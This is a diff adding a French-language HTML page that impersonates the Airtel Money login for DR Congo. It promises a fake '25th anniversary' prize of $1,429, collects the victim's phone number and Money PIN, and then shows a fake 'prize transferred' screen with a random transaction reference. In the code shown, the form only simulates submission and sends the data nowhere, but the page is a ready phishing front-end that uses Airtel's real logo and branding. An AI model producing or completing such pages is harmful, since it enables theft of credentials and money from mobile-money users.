@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Airtel Money - Connexion</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    min-height: 100vh;
+    background: #f5f5f5;
+    font-family: 'DM Sans', 'Segoe UI', Roboto, Arial, sans-serif;
+  }
+
+  /* ==================== LOGIN CONTAINER ==================== */
+  .login-container {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    background: linear-gradient(180deg, #ffffff 0%, #fafafa 100%);
+    max-width: 480px;
+    margin: 0 auto;
+    position: relative;
+    box-shadow: 0 0 60px rgba(0, 0, 0, 0.08);
+  }
+
+  /* ==================== LOGIN HEADER ==================== */
+  .login-header {
+    padding: 32px 24px 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-bottom: 1px solid rgba(192, 0, 26, 0.06);
+  }
+
+  .logo-large {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .logo-large img {
+    height: 44px;
+    width: auto;
+    object-fit: contain;
+  }
+
+  /* ==================== LOGIN CONTENT ==================== */
+  .login-content {
+    flex: 1;
+    padding: 24px 24px 32px;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* ==================== LOGIN TITLE ==================== */
+  .login-title {
+    font-family: 'Syne', 'DM Sans', sans-serif;
+    font-size: 20px;
+    font-weight: 700;
+    color: #1a1a1a;
+    line-height: 1.4;
+    margin-bottom: 24px;
+    letter-spacing: -0.01em;
+  }
+
+  /* ==================== LOGIN FORM ==================== */
+  .login-form {
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+
+  /* ==================== PHONE INPUT ==================== */
+  .phone-input-container {
+    display: flex;
+    align-items: center;
+    background: #ffffff;
+    border: 1.5px solid #e0e0e0;
+    border-radius: 12px;
+    overflow: hidden;
+    transition: all 0.2s;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+  }
+
+  .phone-input-container:focus-within {
+    border-color: #c0001a;
+    box-shadow: 0 0 0 3px rgba(192, 0, 26, 0.1);
+  }
+
+  .country-code {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 14px 14px;
+    background: #fafafa;
+    border-right: 1.5px solid #e0e0e0;
+    font-size: 15px;
+    font-weight: 600;
+    color: #333;
+    white-space: nowrap;
+  }
+
+  .flag-icon {
+    font-size: 18px;
+    line-height: 1;
+  }
+
+  .phone-input {
+    flex: 1;
+    border: none;
+    outline: none;
+    padding: 14px 16px;
+    font-size: 16px;
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 500;
+    color: #1a1a1a;
+    letter-spacing: 0.5px;
+    background: transparent;
+  }
+
+  .phone-input::placeholder {
+    color: #b0b0b0;
+    font-weight: 400;
+  }
+
+  /* ==================== PIN SECTION ==================== */
+  .pin-section {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .pin-label {
+    font-size: 14px;
+    font-weight: 600;
+    color: #333;
+    letter-spacing: 0.01em;
+  }
+
+  .pin-inputs-wrapper {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  /* Single PIN box */
+  .pin-input-single {
+    flex: 1;
+    height: 56px;
+    border: 1.5px solid #e0e0e0;
+    border-radius: 12px;
+    background: #ffffff;
+    font-size: 22px;
+    font-weight: 700;
+    text-align: center;
+    color: #1a1a1a;
+    outline: none;
+    transition: all 0.2s;
+    font-family: 'DM Sans', sans-serif;
+    letter-spacing: 12px;
+    padding-left: 12px;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+  }
+
+  .pin-input-single:focus {
+    border-color: #c0001a;
+    box-shadow: 0 0 0 3px rgba(192, 0, 26, 0.1);
+  }
+
+  .pin-input-single::placeholder {
+    color: #c0c0c0;
+    letter-spacing: 8px;
+    font-size: 20px;
+    font-weight: 400;
+    padding-left: 0;
+  }
+
+  .eye-button {
+    width: 48px;
+    height: 48px;
+    border: 1.5px solid #e0e0e0;
+    border-radius: 12px;
+    background: #ffffff;
+    font-size: 20px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s;
+    flex-shrink: 0;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+  }
+
+  .eye-button:hover {
+    border-color: #c0001a;
+    background: #fff5f5;
+  }
+
+  /* ==================== LOGIN BUTTON ==================== */
+  .login-button {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #c0001a 0%, #e8001f 100%);
+    color: #ffffff;
+    font-size: 15px;
+    font-weight: 800;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all 0.3s;
+    box-shadow: 0 8px 24px rgba(192, 0, 26, 0.35);
+    font-family: 'Syne', 'DM Sans', sans-serif;
+    margin-top: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+
+  .login-button:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 32px rgba(192, 0, 26, 0.5);
+  }
+
+  .login-button:active:not(:disabled) {
+    transform: translateY(0);
+  }
+
+  .login-button:disabled {
+    background: linear-gradient(135deg, #d4d4d4 0%, #b8b8b8 100%);
+    cursor: not-allowed;
+    box-shadow: none;
+    opacity: 0.7;
+  }
+
+  /* ==================== SPINNER ==================== */
+  .spinner {
+    width: 18px;
+    height: 18px;
+    border: 2.5px solid rgba(255, 255, 255, 0.3);
+    border-top-color: #ffffff;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    display: none;
+  }
+
+  .spinner.show {
+    display: block;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* ==================== LOGIN FOOTER ==================== */
+  .login-footer {
+    padding: 24px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 12px;
+    background: #fafafa;
+    border-top: 1px solid rgba(0, 0, 0, 0.05);
+  }
+
+  .login-footer img {
+    height: 28px;
+    width: auto;
+    opacity: 0.5;
+  }
+
+  .footer {
+    font-size: 12px;
+    color: #999;
+    text-align: center;
+    font-weight: 500;
+    letter-spacing: 0.01em;
+  }
+
+  /* ==================== SUCCESS OVERLAY ==================== */
+  .success-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(8px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    z-index: 100;
+    animation: fadeIn 0.4s ease;
+  }
+
+  .success-overlay.show {
+    display: flex;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  .success-modal {
+    width: 100%;
+    max-width: 400px;
+    background: linear-gradient(135deg, #2d0000 0%, #1a0000 100%);
+    border: 1px solid rgba(255, 204, 0, 0.3);
+    border-radius: 24px;
+    padding: 40px 28px;
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 18px;
+    box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 0 0 60px rgba(227, 6, 19, 0.3);
+    animation: slideUp 0.4s ease;
+  }
+
+  @keyframes slideUp {
+    from { transform: translateY(30px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  .success-icon {
+    width: 90px;
+    height: 90px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #00c853, #009624);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 48px;
+    color: #fff;
+    box-shadow: 0 0 40px rgba(0, 200, 83, 0.6);
+    animation: pulse-success 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse-success {
+    0%, 100% { box-shadow: 0 0 40px rgba(0, 200, 83, 0.6); }
+    50% { box-shadow: 0 0 60px rgba(0, 200, 83, 0.9); }
+  }
+
+  .success-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 24px;
+    font-weight: 800;
+    color: #fff;
+  }
+
+  .success-msg {
+    font-size: 14px;
+    color: rgba(255, 255, 255, 0.75);
+    line-height: 1.7;
+  }
+
+  .success-amount {
+    font-size: 44px;
+    font-weight: 900;
+    background: linear-gradient(90deg, #ffcc00, #ffaa00, #ffcc00);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1.1;
+  }
+
+  .success-ref {
+    width: 100%;
+    background: rgba(0, 0, 0, 0.4);
+    border: 1px solid rgba(255, 204, 0, 0.2);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-size: 11px;
+    color: rgba(255, 255, 255, 0.5);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    font-weight: 600;
+  }
+
+  .success-ref strong {
+    display: block;
+    font-size: 15px;
+    color: #ffcc00;
+    font-weight: 800;
+    letter-spacing: 1.5px;
+    text-transform: none;
+    font-family: 'Courier New', monospace;
+    margin-top: 6px;
+  }
+
+  /* ==================== RESPONSIVE ==================== */
+  @media (max-width: 480px) {
+    .login-container { box-shadow: none; }
+    .login-header { padding: 24px 20px 16px; }
+    .login-content { padding: 20px 20px 24px; }
+    .login-title { font-size: 18px; }
+    .pin-input-single { height: 52px; font-size: 20px; letter-spacing: 10px; }
+    .eye-button { width: 44px; height: 44px; }
+    .login-button { font-size: 14px; padding: 15px; }
+  }
+
+  @media (max-width: 360px) {
+    .pin-input-single { height: 48px; font-size: 18px; letter-spacing: 8px; }
+    .eye-button { width: 40px; height: 40px; font-size: 18px; }
+  }
+</style>
+</head>
+<body>
+<div id="root">
+  <div class="login-container">
+    <div class="login-header">
+      <div class="logo-large">
+        <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+      </div>
+    </div>
+    <div class="login-content">
+      <div style="background: linear-gradient(135deg, rgb(122, 0, 0) 0%, rgb(192, 0, 26) 60%, rgb(232, 0, 31) 100%); border-radius: 16px; padding: 14px 18px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; box-shadow: rgba(192, 0, 26, 0.25) 0px 4px 20px;">
+        <div style="font-size: 28px; flex-shrink: 0;">🏆</div>
+        <div>
+          <div style="font-family: Syne, sans-serif; font-size: 13px; font-weight: 800; color: rgb(255, 215, 0); letter-spacing: 0.04em; margin-bottom: 2px;">Airtel DRC · 25ème Anniversaire</div>
+          <div style="font-size: 12px; color: rgba(255, 255, 255, 0.85); line-height: 1.4;">Connectez-vous pour réclamer votre prix de <strong style="color: rgb(255, 255, 255); font-size: 14px;">$1,429</strong></div>
+        </div>
+      </div>
+      <h1 class="login-title">Connectez-vous à Airtel Money pour réclamer votre récompense.</h1>
+      <form class="login-form" id="loginForm">
+        <div class="phone-input-container">
+          <div class="country-code">
+            <span class="flag-icon">🇨🇩</span>
+            <span>+243</span>
+          </div>
+          <input class="phone-input" id="phoneInput" placeholder="912345678" maxlength="10" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required type="tel" value="912344567">
+        </div>
+        <div class="pin-section">
+          <p class="pin-label">Entrez votre Code PIN</p>
+          <div class="pin-inputs-wrapper">
+            <input class="pin-input-single" id="pinInput" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]*" required type="password" value="">
+            <button type="button" class="eye-button" aria-label="Afficher le PIN">👁️‍🗨️</button>
+          </div>
+        </div>
+        <button type="submit" class="login-button" id="loginBtn" disabled>
+          <span class="spinner" id="spinner"></span>
+          <span id="loginBtnText">SE CONNECTER &amp; RÉCLAMER</span>
+        </button>
+      </form>
+    </div>
+    <div class="login-footer">
+      <div>
+        <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+      </div>
+      <footer class="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
+    </div>
+  </div>
+
+  <!-- SUCCESS OVERLAY -->
+  <div class="success-overlay" id="successOverlay">
+    <div class="success-modal">
+      <div class="success-icon">✓</div>
+      <div class="success-title">Prix Transféré !</div>
+      <p class="success-msg">Votre récompense a été envoyée à votre compte Airtel Money.</p>
+      <div class="success-amount">$1,429</div>
+      <div class="success-ref">
+        Référence de transaction
+        <strong id="successRef">AIR-LDMT-6936</strong>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ==================== ELEMENTS ==================== */
+  const pinInput = document.getElementById('pinInput');
+  const phoneInput = document.getElementById('phoneInput');
+  const loginBtn = document.getElementById('loginBtn');
+  const eyeButton = document.querySelector('.eye-button');
+
+  /* ==================== PIN INPUT (digits only, max 4) ==================== */
+  pinInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    checkPinComplete();
+
+    // Auto-submit when 4 digits entered
+    if (e.target.value.length === 4) {
+      // Optional: auto-focus the button
+      loginBtn.focus();
+    }
+  });
+
+  function checkPinComplete() {
+    loginBtn.disabled = pinInput.value.length !== 4;
+  }
+
+  /* ==================== EYE BUTTON (Show/Hide PIN) ==================== */
+  let pinVisible = false;
+
+  eyeButton.addEventListener('click', () => {
+    pinVisible = !pinVisible;
+    pinInput.type = pinVisible ? 'text' : 'password';
+    eyeButton.textContent = pinVisible ? '🙈' : '👁️‍🗨️';
+    eyeButton.setAttribute('aria-label', pinVisible ? 'Masquer le PIN' : 'Afficher le PIN');
+  });
+
+  /* ==================== PHONE INPUT (digits only) ==================== */
+  phoneInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '');
+  });
+
+  /* ==================== FORM SUBMIT + SPINNER ==================== */
+  document.getElementById('loginForm').addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    const spinner = document.getElementById('spinner');
+    const btnText = document.getElementById('loginBtnText');
+
+    // Show spinner
+    spinner.classList.add('show');
+    btnText.textContent = 'CONNEXION EN COURS...';
+    loginBtn.disabled = true;
+
+    // Generate random reference
+    const ref = 'AIR-LDMT-' + Math.floor(1000 + Math.random() * 9000);
+    document.getElementById('successRef').textContent = ref;
+
+    // Simulate API call (2 seconds)
+    setTimeout(() => {
+      spinner.classList.remove('show');
+      btnText.textContent = 'SE CONNECTER & RÉCLAMER';
+
+      // Show success overlay
+      document.getElementById('successOverlay').classList.add('show');
+    }, 2000);
+  });
+
+  /* ==================== CLOSE SUCCESS (tap anywhere) ==================== */
+  document.getElementById('successOverlay').addEventListener('click', () => {
+    document.getElementById('successOverlay').classList.remove('show');
+  });
+</script>
+</body>
+</html>
